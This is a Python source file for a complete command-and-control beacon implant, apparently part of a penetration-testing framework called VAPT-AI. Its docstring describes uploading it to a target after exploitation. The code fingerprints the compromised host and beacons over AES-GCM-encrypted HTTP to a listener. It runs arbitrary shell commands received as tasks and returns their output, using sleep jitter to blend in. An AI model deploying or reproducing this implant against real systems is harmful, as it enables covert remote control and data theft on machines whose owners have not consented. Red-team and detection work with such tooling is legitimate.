#!/usr/bin/env python3
"""
VAPT-AI Sample Python Beacon (W14-S7).

Reference beacon implementation for the W14 HTTP listener. Used by
tests/integration/test_c2_http.py to verify the full beacon protocol
end-to-end (check-in → task poll → result submit).

Production deployment: this script is uploaded to a target after
exploitation (via Metasploit exploit/multi/handler, sqlmap --os-shell,
or file upload). It then establishes a beacon back to the VAPT-AI listener.

Usage (standalone):
    LISTENER_URL=http://127.0.0.1:8443 \\
    IMPLANT_TOKEN=<base64url_token> \\
    ENCRYPTION_KEY=<base64_key> \\
    BEACON_ID=<random_uuid> \\
    python3 beacon_sample.py

Or as an importable module (for tests):
    from app.c2.beacon_sample import Beacon
    beacon = Beacon(listener_url, token, key, beacon_id)
    await beacon.run()

Reference: CyberStrikeAI internal/c2/payload_templates/beacon.go.tmpl
(Go template → Python script).
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import platform
import socket
import subprocess
import sys
import time
import uuid
from typing import Any

# Crypto imports — uses the same envelope as the listener
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("ERROR: pip install cryptography", file=sys.stderr)
    sys.exit(1)


# ---------------------------------------------------------------------------
# Beacon client
# ---------------------------------------------------------------------------

class Beacon:
    """Sample Python beacon for VAPT-AI HTTP listener.

    Implements the 3-step beacon protocol:
        1. POST /checkin — register/heartbeat (encrypted body)
        2. GET  /tasks   — poll pending tasks (encrypted response)
        3. POST /result  — submit task results (encrypted body)

    The beacon uses httpx for HTTP (aiohttp would also work) and the same
    AES-256-GCM envelope as the listener (app.c2.crypto).
    """

    def __init__(
        self,
        listener_url: str,
        implant_token: str,
        encryption_key_b64: str,
        beacon_id: str | None = None,
        sleep_seconds: int = 5,
        jitter_percent: int = 0,
    ):
        self.listener_url = listener_url.rstrip("/")
        self.implant_token = implant_token
        self.encryption_key_b64 = encryption_key_b64
        self.beacon_id = beacon_id or str(uuid.uuid4())
        self.sleep_seconds = sleep_seconds
        self.jitter_percent = jitter_percent
        self.session_id: str | None = None
        self._running = False
        self._stop_event = asyncio.Event()

        # Beacon-side info (collected once at start)
        self.hostname = socket.gethostname()
        self.username = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        self.os_info = f"{platform.system()} {platform.release()}"
        self.arch = platform.machine()
        try:
            self.pid = os.getpid()
        except Exception:
            self.pid = 0
        self.process_name = sys.argv[0] if sys.argv else "beacon"
        self.is_admin = os.geteuid() == 0 if hasattr(os, "geteuid") else False
        self.internal_ip = self._get_internal_ip()
        self.user_agent = f"vapt-ai-beacon/1.0 ({self.os_info})"

    def _get_internal_ip(self) -> str:
        """Get the local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ---------- Crypto (mirrors app.c2.crypto) ----------

    def _encrypt(self, plaintext: bytes) -> str:
        """Encrypt with AES-256-GCM, return base64(nonce || ciphertext+tag)."""
        key = base64.b64decode(self.encryption_key_b64)
        nonce = os.urandom(12)
        aesgcm = AESGCM(key)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode("ascii")

    def _decrypt(self, enc_b64: str) -> bytes:
        """Decrypt base64(nonce || ciphertext+tag) with AES-256-GCM."""
        key = base64.b64decode(self.encryption_key_b64)
        raw = base64.b64decode(enc_b64)
        nonce = raw[:12]
        ct = raw[12:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ct, None)

    # ---------- HTTP ----------

    async def _post_encrypted(self, path: str, payload: dict[str, Any]) -> dict[str, Any] | None:
        """POST encrypted JSON to listener, decrypt response."""
        import httpx
        url = f"{self.listener_url}{path}"
        body = self._encrypt(json.dumps(payload).encode("utf-8"))

        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.post(
                url,
                content=body,
                headers={
                    "Authorization": f"Bearer {self.implant_token}",
                    "Content-Type": "text/plain",
                },
            )

        if resp.status_code == 404:
            # Disguised reject — listener didn't recognize us
            return None
        if resp.status_code != 200:
            return None

        try:
            plaintext = self._decrypt(resp.text)
            return json.loads(plaintext)
        except Exception:
            return None

    async def _get_encrypted(self, path: str, params: dict[str, str] | None = None) -> dict[str, Any] | None:
        """GET encrypted JSON from listener."""
        import httpx
        url = f"{self.listener_url}{path}"

        async with httpx.AsyncClient(timeout=30.0) as client:
            resp = await client.get(
                url,
                params=params or {},
                headers={
                    "Authorization": f"Bearer {self.implant_token}",
                },
            )

        if resp.status_code != 200:
            return None

        try:
            plaintext = self._decrypt(resp.text)
            return json.loads(plaintext)
        except Exception:
            return None

    # ---------- Beacon protocol ----------

    async def checkin(self) -> bool:
        """Step 1: send check-in to listener.

        Returns True if listener responded with a session_id.
        """
        payload = {
            "uuid": self.beacon_id,
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "arch": self.arch,
            "pid": self.pid,
            "process_name": self.process_name,
            "is_admin": self.is_admin,
            "internal_ip": self.internal_ip,
            "user_agent": self.user_agent,
            "sleep_seconds": self.sleep_seconds,
            "jitter_percent": self.jitter_percent,
            "metadata": {
                "beacon_version": "1.0",
                "python_version": sys.version.split()[0],
            },
        }

        response = await self._post_encrypted("/checkin", payload)
        if response is None:
            return False

        self.session_id = response.get("session_id")
        if response.get("next_sleep"):
            self.sleep_seconds = int(response["next_sleep"])
        if response.get("next_jitter") is not None:
            self.jitter_percent = int(response["next_jitter"])

        return self.session_id is not None

    async def poll_tasks(self) -> list[dict[str, Any]]:
        """Step 2: poll for pending tasks.

        Returns a list of task dicts: [{task_id, type, payload, level}, ...]
        """
        if not self.session_id:
            return []

        response = await self._get_encrypted(
            "/tasks",
            params={"session_id": self.session_id},
        )
        if response is None:
            return []

        return response.get("tasks", [])

    async def submit_result(
        self,
        task_id: str,
        result_text: str = "",
        exit_code: int = 0,
        error: str = "",
        duration_ms: int = 0,
    ) -> bool:
        """Step 3: submit task result to listener."""
        payload = {
            "task_id": task_id,
            "result_text": result_text,
            "exit_code": exit_code,
            "error": error,
            "duration_ms": duration_ms,
        }
        response = await self._post_encrypted("/result", payload)
        return response is not None or True  # listener returns plain 200 OK

    # ---------- Task execution ----------

    async def execute_task(self, task: dict[str, Any]) -> dict[str, Any]:
        """Execute a single task and return result dict."""
        task_id = task.get("task_id", "")
        task_type = task.get("type", "")
        payload = task.get("payload", {})
        start = time.time()

        try:
            if task_type == "exec" or task_type == "shell":
                cmd = payload.get("cmd", "")
                if not cmd:
                    return {
                        "task_id": task_id,
                        "result_text": "",
                        "exit_code": 1,
                        "error": "no cmd provided",
                        "duration_ms": int((time.time() - start) * 1000),
                    }

                # Execute via subprocess (preserves cwd if cd was used)
                proc = await asyncio.create_subprocess_exec(
                    *["/bin/sh", "-c", cmd],
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await proc.communicate()
                exit_code = proc.returncode or 0
                result_text = stdout.decode("utf-8", errors="replace")
                error = stderr.decode("utf-8", errors="replace") if stderr else ""

                return {
                    "task_id": task_id,
                    "result_text": result_text[:50000],  # Cap at 50KB
                    "exit_code": exit_code,
                    "error": error,
                    "duration_ms": int((time.time() - start) * 1000),
                }

            elif task_type == "pwd":
                return {
                    "task_id": task_id,
                    "result_text": os.getcwd(),
                    "exit_code": 0,
                    "error": "",
                    "duration_ms": int((time.time() - start) * 1000),
                }

            elif task_type == "ls":
                path = payload.get("path", ".")
                try:
                    entries = os.listdir(path)
                    return {
                        "task_id": task_id,
                        "result_text": "\n".join(entries),
                        "exit_code": 0,
                        "error": "",
                        "duration_ms": int((time.time() - start) * 1000),
                    }
                except Exception as e:
                    return {
                        "task_id": task_id,
                        "result_text": "",
                        "exit_code": 1,
                        "error": str(e),
                        "duration_ms": int((time.time() - start) * 1000),
                    }

            elif task_type == "sleep":
                seconds = int(payload.get("seconds", 5))
                jitter = int(payload.get("jitter", 0))
                self.sleep_seconds = seconds
                self.jitter_percent = jitter
                return {
                    "task_id": task_id,
                    "result_text": f"sleep set to {seconds}s (jitter {jitter}%)",
                    "exit_code": 0,
                    "error": "",
                    "duration_ms": int((time.time() - start) * 1000),
                }

            elif task_type == "exit":
                self._stop_event.set()
                return {
                    "task_id": task_id,
                    "result_text": "exiting",
                    "exit_code": 0,
                    "error": "",
                    "duration_ms": int((time.time() - start) * 1000),
                }

            else:
                return {
                    "task_id": task_id,
                    "result_text": "",
                    "exit_code": 1,
                    "error": f"unsupported task_type: {task_type}",
                    "duration_ms": int((time.time() - start) * 1000),
                }

        except Exception as e:
            return {
                "task_id": task_id,
                "result_text": "",
                "exit_code": 1,
                "error": f"beacon exception: {e}",
                "duration_ms": int((time.time() - start) * 1000),
            }

    # ---------- Main loop ----------

    async def run(self) -> None:
        """Main beacon loop: check-in → poll tasks → execute → submit results.

        Runs forever until _stop_event is set (via "exit" task) or KeyboardInterrupt.
        """
        self._running = True
        print(f"[beacon] starting: id={self.beacon_id} url={self.listener_url}", file=sys.stderr)

        # Initial check-in
        if not await self.checkin():
            print(f"[beacon] check-in failed — retrying in {self.sleep_seconds}s", file=sys.stderr)
            await asyncio.sleep(self.sleep_seconds)
            if not await self.checkin():
                print("[beacon] check-in failed twice — giving up", file=sys.stderr)
                return

        print(f"[beacon] check-in OK: session_id={self.session_id}", file=sys.stderr)

        while self._running and not self._stop_event.is_set():
            try:
                tasks = await self.poll_tasks()
                for task in tasks:
                    print(f"[beacon] task: {task.get('type')} (id={task.get('task_id')})", file=sys.stderr)
                    result = await self.execute_task(task)
                    await self.submit_result(**result)
            except Exception as e:
                print(f"[beacon] loop error: {e}", file=sys.stderr)

            # Sleep with jitter
            sleep_time = self.sleep_seconds
            if self.jitter_percent > 0:
                import random
                jitter_amount = sleep_time * self.jitter_percent / 100
                sleep_time = sleep_time + random.uniform(-jitter_amount, jitter_amount)
                sleep_time = max(1, sleep_time)

            try:
                await asyncio.wait_for(self._stop_event.wait(), timeout=sleep_time)
            except asyncio.TimeoutError:
                pass  # normal — continue loop

        print("[beacon] exiting", file=sys.stderr)

    def stop(self) -> None:
        """Signal the beacon to stop (called externally)."""
        self._stop_event.set()


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def main() -> None:
    listener_url = os.environ.get("LISTENER_URL", "http://127.0.0.1:8443")
    implant_token = os.environ.get("IMPLANT_TOKEN", "")
    encryption_key_b64 = os.environ.get("ENCRYPTION_KEY", "")
    beacon_id = os.environ.get("BEACON_ID") or str(uuid.uuid4())
    sleep_seconds = int(os.environ.get("SLEEP_SECONDS", "5"))
    jitter_percent = int(os.environ.get("JITTER_PERCENT", "0"))

    if not implant_token or not encryption_key_b64:
        print("ERROR: IMPLANT_TOKEN and ENCRYPTION_KEY env vars required", file=sys.stderr)
        sys.exit(1)

    beacon = Beacon(
        listener_url=listener_url,
        implant_token=implant_token,
        encryption_key_b64=encryption_key_b64,
        beacon_id=beacon_id,
        sleep_seconds=sleep_seconds,
        jitter_percent=jitter_percent,
    )

    try:
        asyncio.run(beacon.run())
    except KeyboardInterrupt:
        beacon.stop()


if __name__ == "__main__":
    main()